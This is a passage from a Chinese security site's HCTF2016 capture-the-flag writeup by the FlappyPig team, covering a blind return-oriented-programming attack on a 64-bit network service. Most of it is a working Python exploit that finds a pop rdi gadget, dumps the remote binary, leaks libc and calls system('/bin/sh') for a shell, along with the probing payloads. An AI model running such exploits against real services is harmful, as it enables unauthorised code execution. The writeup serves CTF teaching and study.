YaHei&quot;;">因为是64位程序，要想实现任意地址泄露，主要需要知道pop_rdi_ret和puts_plt的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当一个地址满足如下3个payload都能正常打印NO password, No game的话，就可以得到一个pop rdi;ret的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">Payload1&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(addr-1)+l64(0)+l64(0x400711)&nbsp;</code></div><div class="line number2 index1 alt1"><code class="plain plain">Payload2&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(addr)+l64(0)+l64(0x400711)&nbsp;</code></div><div class="line number3 index2 alt2"><code class="plain plain">Payload3&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(addr+1)&nbsp;+l64(0x400711)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最终得到的pop_rdi_ret地址为0x4007c3。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构造</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Payload3 = 'a'*72 + l64(pop_rdi_ret) +l64(0x400000)+l64(addr)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果程序打印前4个字节为\x7fELF，则addr为puts_plt。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">得到puts_plt的地址为0x400570</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">后面就是dump+exp了。Exp大致如下:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;threading&nbsp;import&nbsp;Thread</code></div><div class="line number2 index1 alt1"><code class="plain plain">import&nbsp;time</code></div><div class="line number3 index2 alt2"><code class="plain plain">#&nbsp;from&nbsp;uploadflag&nbsp;import&nbsp;*</code></div><div class="line number4 index3 alt1"><code class="plain plain">from&nbsp;zio&nbsp;import&nbsp;*</code></div><div class="line number5 index4 alt2"><code class="plain plain">target&nbsp;=&nbsp;('119.254.101.197',&nbsp;10000)</code></div><div class="line number6 index5 alt1"><code class="plain plain">target&nbsp;=&nbsp;'./test'</code></div><div class="line number7 index6 alt2"><code class="plain plain">target&nbsp;=&nbsp;('115.28.78.54',&nbsp;13455)</code></div><div class="line number8 index7 alt1"><code class="plain plain">def&nbsp;interact(io):</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">def&nbsp;run_recv():</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">while&nbsp;True:</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">try:</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">output&nbsp;=&nbsp;io.read_until_timeout(timeout=1)</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#&nbsp;print&nbsp;output</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">except:</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t1&nbsp;=&nbsp;Thread(target=run_recv)</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">t1.start()</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">while&nbsp;True:</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;=&nbsp;raw_input()</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;d&nbsp;!=&nbsp;'':</code></div><div class="line number21 index20 alt2"><code class="plain plain">def&nbsp;exp4(target):</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">puts_plt&nbsp;=&nbsp;0x400570</code></div><div class="line number23 index22 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">pop_rdi_ret&nbsp;=&nbsp;0x4007c3</code></div><div class="line number24 index23 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(RAW,&nbsp;'red'),&nbsp;\</code></div><div class="line number25 index24 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print_write=COLORED(RAW,&nbsp;'green'))</code></div><div class="line number26 index25 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('token:')</code></div><div class="line number27 index26 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')</code></div><div class="line number28 index27 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">base&nbsp;=&nbsp;0x400000</code></div><div class="line number29 index28 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;=&nbsp;''</code></div><div class="line number30 index29 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">while&nbsp;True:</code></div><div class="line number31 index30 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;hex(len(d))</code></div><div class="line number32 index31 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('?\n')</code></div><div class="line number33 index32 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(pop_rdi_ret)&nbsp;+l64(base+len(d))&nbsp;+&nbsp;l64(puts_plt)</code></div><div class="line number34 index33 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline(payload)</code></div><div class="line number35 index34 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;+=&nbsp;io.readline()[:-1]&nbsp;+&nbsp;'\x00'</code></div><div class="line number36 index35 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(d)&nbsp;&gt;&nbsp;0x9bc:</code></div><div class="line number37 index36 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">break</code></div><div class="line number38 index37 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f&nbsp;=&nbsp;open('code.bin',&nbsp;'wb')</code></div><div class="line number39 index38 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f.write(d)</code></div><div class="line number40 index39 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f.close()</code></div><div class="line number41 index40 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">base&nbsp;=&nbsp;0x600e10</code></div><div class="line number42 index41 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;=&nbsp;''</code></div><div class="line number43 index42 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">while&nbsp;True:</code></div><div class="line number44 index43 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;hex(len(d))</code></div><div class="line number45 index44 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('?\n')</code></div><div class="line number46 index45 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">payload&nbsp;=&nbsp;'a'*72&nbsp;+&nbsp;l64(pop_rdi_ret)&nbsp;+l64(base+len(d))&nbsp;+&nbsp;l64(puts_plt)</code></div><div class="line number47 index46 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline(payload)</code></div><div class="line number48 index47 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">d&nbsp;+=&nbsp;io.readline()[:-1]&nbsp;+&nbsp;'\x00'</code></div><div class="line number49 index48 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(d)&nbsp;&gt;&nbsp;0x248:</code></div><div class="line number50 index49 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">break</code></div><div class="line number51 index50 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f&nbsp;=&nbsp;open('data.bin',&nbsp;'wb')</code></div><div class="line number52 index51 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f.write(d)</code></div><div class="line number53 index52 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f.close()</code></div><div class="line number54 index53 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.close()</code></div><div class="line number55 index54 alt2"><code class="plain plain">def&nbsp;exp5(target):</code></div><div class="line number56 index55 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">puts_plt&nbsp;=&nbsp;0x400570</code></div><div class="line number57 index56 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">pop_rdi_ret&nbsp;=&nbsp;0x4007c3</code></div><div class="line number58 index57 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">read_got&nbsp;=&nbsp;0x601028</code></div><div class="line number59 index58 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">puts_got&nbsp;=&nbsp;0x601018</code></div><div class="line number60 index59 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">passcode&nbsp;=&nbsp;'aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk'</code></div><div class="line number61 index60 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(RAW,&nbsp;'red'),&nbsp;\</code></div><div class="line number62 index61 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print_write=COLORED(RAW,&nbsp;'green'))</code></div><div class="line number63 index62 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('token:')</code></div><div class="line number64 index63 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')</code></div><div class="line number65 index64 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('?\n')</code></div><div class="line number66 index65 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">main&nbsp;=&nbsp;0x004006BD</code></div><div class="line number67 index66 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline('a'*72+l64(pop_rdi_ret)+l64(puts_got)+l64(puts_plt)+l64(main))</code></div><div class="line number68 index67 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">base&nbsp;=&nbsp;l64(io.readline()[:-1].ljust(8,&nbsp;'\x00'))&nbsp;-&nbsp;0x000000000006f690</code></div><div class="line number69 index68 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">system&nbsp;=&nbsp;base&nbsp;+&nbsp;0x0000000000045390</code></div><div class="line number70 index69 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">binsh&nbsp;=&nbsp;base&nbsp;+&nbsp;0x18c177</code></div><div class="line number71 index70 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.read_until('?\n')</code></div><div class="line number72 index71 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io.writeline('a'*72+l64(pop_rdi_ret)+l64(binsh)+l64(system)+l64(main))</code></div><div class="line number73 index72 alt2"><code class="plain plain">interact(io)</code></div><div class="line number74 index73 alt1"><code class="plain plain">exp5(target)</code></div></div></td></tr></tbody></table><p style="text-align: center;"><br></p><p></p>
<hr>
<p style="text-align: center;">
<a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/app.jpeg" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/app.jpeg" style="visibility: visible;"></a>
<a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/weixin.jpeg" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/weixin.jpeg" style="visibility: visible;"></a>
</p>

                        <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br>本文地址：http://bobao.360.cn/ctf/detail/179.html</p>
                      </div>
          <div class="mt40"><div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体">
    <input type="hidden" id="use_nickname" name="use_nickname" value="0">
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide" id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="179">
        <input type="hidden" id="source-type" value="ctf">
        <input type="hidden" id="post-comment-url" value="/comment/add">
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax">
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin">
        <input type="hidden" id="stoken_comment_set" value="06a51e4af59064182b066cb4987c17bd">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0">

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6247" user-name="Helen" href="javascript:;">
                Helen            </a>
                        <span class="comment-time">2016-11-29 21:26:45</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6247">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;" class="good" data-target="/comment/good" data-value="g_6247" data-type="comment">点赞(0)</a></span>
            </div>
        </div>

        <p class="content">看不太懂啊···都是二进制</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="ctf" data-source-id="179" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
//        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script></div>
      </div>
  </div>
  <div class="side-bar">
      <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="http://bobao.360.cn/learning/detail/3530.html" alt="【技术分享】基于SQLite数据库的Web应用程序注入指南" target="_blank">【技术分享】基于SQLite数据库...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3524.html" alt="【技术分享】我的MITRE物联网挑战赛之旅" target="_blank">【技术分享】我的MITRE物联网挑...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3516.html" alt="【技术分享】Metasploit驰骋内网直取域管首级" target="_blank">【技术分享】Metasploit驰骋内...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3529.html" alt="【漏洞预警】雪藏11年：Linux kernel DCCP double-free 权限提升漏洞（CVE-2017-6074）" target="_blank">【漏洞预警】雪藏11年：Linux...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3514.html" alt="【技术分享】如何通过CVE-2015-7547(GLIBC getaddrinfo)漏洞绕过ASLR" target="_blank">【技术分享】如何通过CVE-201...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3517.html" alt="【技术分享】文件格式Fuzz实践" target="_blank">【技术分享】文件格式Fuzz实践</a></li>
            </ul>
</div>      <!-- 友情链接 -->
	  <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="http://bobao.360.cn/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com/" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn/" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
                <li><a href="http://www.ichunqiu.com/" alt="i春秋学院-信息安全体验中心" target="_blank">i春秋学院-信息安全体验中心</a></li>
            </ul>
    </div>
      <!-- 联系我们 -->
      <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/qrcode_adlab_weixin.png" width="145px" height="145px;">
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/scan_code_big.png" width="145px" height="145px;">
    </div>
    
</div>

  </div>
</div>

<script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/jquery-ui.min.js.下载"></script>
<script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.noty.packaged.min.js.下载"></script>
<script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/common.js.下载"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/shCore.js.下载"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

	    <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="http://bobao.360.cn/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
        Copyright © 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
        
</div>

<!--奇舞团统计-->
<script src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/8e133f74.js.下载"></script>
<script>
    monitor.setProject('360_bobao_pc').getTrack().getClickAndKeydown();
</script>

<div class="hide">
<script src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/z_stat.php" language="JavaScript"></script><script src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/core.php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1253147824" target="_blank" title="站长统计">站长统计</a>
</div>
    <div class="backToTop_wrap">
        <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
    </div>
    <script>
        var $backToTop_wrap = $(".backToTop_wrap"),
            $backToTop_btn  = $("#back_to_top");
    
        if($(window).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    
        $(window).on("scroll", function(){
            if($(this).scrollTop() > 100) {
                $backToTop_wrap.removeClass("off");
            }
            else {
